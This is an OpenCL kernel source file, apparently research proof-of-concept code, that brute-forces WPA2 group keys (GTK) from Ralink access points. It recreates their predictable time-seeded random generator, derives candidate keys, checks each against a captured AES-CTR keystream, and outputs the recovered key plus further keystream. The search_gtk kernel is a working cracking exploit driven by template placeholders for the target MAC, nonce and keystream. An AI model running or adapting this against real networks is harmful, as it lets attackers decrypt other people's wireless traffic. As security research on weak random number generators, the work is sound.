/*
 * This software is Copyright (c) 2016 Mathy Vanhoef and it is hereby released
 * to the general public under the following terms: Redistribution and use in
 * source and binary forms, with or without modification, are permitted.
 *
 * TODO: Speed up executiong of AES
 * TODO: Better usage/management of global memory?
 * TODO: Manually optimize the working groups?
 */

#include "ieeeprf.cl"
#include "AESOpenCL.cl"
#include "util.cl"


/**
 * @param time		Time in little-endian (native format)
 * @param output	32-bytes output in Big Endian
 */
void ralink_gen_random_all(uint time, uint __private output[32][8])
{
	// Hardcode the MAC address and insert the time (both in big endian)
	uint buff[11]    = {0x%(MACADDR1)08X, 0x%(MACADDR2)08X}; // 0x382C4AC1, 0x69BC0000
	uint buffinc[11] = {0x%(MACADDR1)08X, 0x%(MACADDR2)08X}; // 0x382C4AC1, 0x69BC0000
	buff[1] |= ((time >> 8) & 0xFF) | ((time & 0xFF) << 8);
	buff[2] = ((time & 0xFF000000) >> 8) | ((time & 0x00FF0000) << 8);

	time++;
	buffinc[1] |= ((time >> 8) & 0xFF) | ((time & 0xFF) << 8);
	buffinc[2] = ((time & 0xFF000000) >> 8) | ((time & 0x00FF0000) << 8);

	// First loop
	prf256_counter(buff, output[0]);

	// Other loops
	#pragma unroll
	for	(int i = 1; i < 32; i++)
	{
		// Continue path without increase in timestamp. Executed first so we
		// use the previous value of output[i - 1] before it's updated.
		memcpy_offset10(buff, output[i - 1]);
		buff[10] |= i << 8;
		prf256_counter(buff, output[i]);

		// Continue with previously increased timestamps, and
		// new 'fork' where an increase in timestamp happens
		for (int j = 0; j < i; ++j)
		{
			memcpy_offset10(buffinc, output[j]);
			buffinc[10] |= i << 8;
			prf256_counter(buffinc, output[j]);
		}
	}
}


__kernel void search_gtk(__global uint gmks[224][8], __global uint *dst)
{
	unsigned int delta = get_global_id(0);
	unsigned int gmkid = get_global_id(1);
	// Load GMK, generate GNONCEs, and derive GTK
	uint gmk[8];
	uint gnonce[32][8];
	uint data[10] = {0x%(MACADDR1)08X, 0x%(MACADDR2)08X};
	uint gtk[8];
	// Variables to test decryption with GTK
	uint nonce[4] = {0x%(NONCE1)08X, 0x%(NONCE2)08X, 0x%(NONCE3)08X, 0x%(NONCE4)08X}; //{0x2C380001, 0xBC69C14A, 0x00000000, 0x0100B800};
	uint xorpad[4];
	AES_KEY key;

	// 1. Pull the GMK we are given
	#pragma unroll
	for (int i = 0; i < 8; ++i)
		gmk[i] = gmks[gmkid][i];

	// 2. Generate possible gnonce's for requested start time
	ralink_gen_random_all(%(STARTTIME)d + delta, gnonce);

	// 3. Derive the possible GTKs and check their validity
	for (int i = 0; i < 32; ++i)
	{
		memcpy_offset6(data, gnonce[i]);
		prf256_gtk(gmk, data, gtk);

		// Set the key and derive the AES-CTR keystream (input/output is Little Endian)
		AES_set_encrypt_key(gtk, &key);
		AES_encrypt(nonce, xorpad, &key);

		if (xorpad[0] == 0x%(KEYSTREAM1)08X && (xorpad[1] & 0x0000FFFF) == 0x%(KEYSTREAM2)08X)
		{
			COPY_GTK(dst, gtk);
			dst[8]  = gmkid;
			dst[9]  = delta;
			dst[10] = i;

			// Copy some keystream for demo
			for (int j = 0; j < 100; ++j)
			{
				nonce[3] = (nonce[3] & 0x00FFFFFF) | ((j + 1) << 24);
				AES_encrypt(nonce, xorpad, &key);
				dst[10 + j * 4 + 1] = xorpad[0];
				dst[10 + j * 4 + 2] = xorpad[1];
				dst[10 + j * 4 + 3] = xorpad[2];
				dst[10 + j * 4 + 4] = xorpad[3];
			}

			return;
		}
	}
}


#if 0
/**
 * Function to easily test our code so far.
 *
 * @param time		Time in little-endian (native format)
 * @param output	32-bytes output in Big Endian
 */
void ralink_gen_random(uint time, uint __private *output)
{
	// Hardcode the MAC address and insert the time (both in big endian)
	uint buff[11] = {0x%(MACADDR1)08X, 0x%(MACADDR2)08X}; // 0x382C4AC1, 0x69BC0000
	buff[1] |= ((time >> 8) & 0xFF) | ((time & 0xFF) << 8);
	buff[2] = ((time & 0xFF000000) >> 8) | ((time & 0x00FF0000) << 8);

	// First loop
	prf256_counter(buff, output);

	// Other loops
	#pragma unroll
	for	(int i = 1; i < 32; i++)
	{
		// buff = AA || time || output || i
		memcpy_offset10(buff, output);
		buff[10] |= i << 8;

		// output = PRF(zeros, "Init Counter", buff)
		prf256_counter(buff, output);
	}
}


/**
 * This function is commented out because compiling it is horribly slow. If we replace
 * the constants 4294894231 and 4294894235, the compilation process is much faster.
 *
 * This kernel should return:
 *     ['0xd0fab4adL', '0xa148bd69L', '0xbff74c47L', '0x3fa98f8dL',
 *      '0xe0e19e90L', '0xc8f1d7b3L', '0xcd9028d1L', '0x902759f5L']
 * When used with the MAC address `{0x382C4AC1, 0x69BC0000}` in `ralink_gen_random`.
 */
__kernel void test_genrandom_gtk(uint __global *gtk)
{
	uint gmk[8] = {};
	uint gnonce[8] = {};
	uint data[10] = {0x382C4AC1, 0x69BC0000};
	uint temp[8];

	// ['0x4a16ebffL', '0x9ef2be9L', '0xe96c8965L', '0xf82d3f8L', '0xe8a5862aL', '0xbe716feL', '0x242eb3eL', '0x4b4f74b6L']
	ralink_gen_random(4294894231, gmk);
	// ['0xa85d097fL', '0x52ad4cc1L', '0x4e45866L', '0x173e241L', '0xced4fdbaL', '0x25695f7cL', '0x1c4b03ceL', '0x468a7857L']
	ralink_gen_random(4294894235, gnonce);

	memcpy_offset6(data, gnonce);
	prf256_gtk(gmk, data, temp);

	for (int i = 0; i < 8; ++i)
		gtk[i] = temp[i];
}
#endif


__kernel void test_aes(__global uint *output)
{
	uint nonce[4] = {0x2C380001, 0xBC69C14A, 0x00000000, 0x0100B800};	// Direct output of airtun-ng (little endian)
	uint tk[4] = {0x7de2f673, 0x6b436441, 0xC6DC6D4E, 0xAE8812F8};		// SWAP32 output of airtun-ng (big endian)
	uint xorpad[4] = {0xD4E415CB, 0xD038A82B, 0x10A673DE, 0xEA25B206};	// Direct output of airtun-ng (little endian)
	AES_KEY key;
	
	// This is correct, apart from Endiannes perhaps
	AES_set_encrypt_key(tk, &key);
	AES_encrypt(nonce, xorpad, &key);

	for (int i = 0; i < 4; ++i)
		output[i] = xorpad[i];

	return;
}


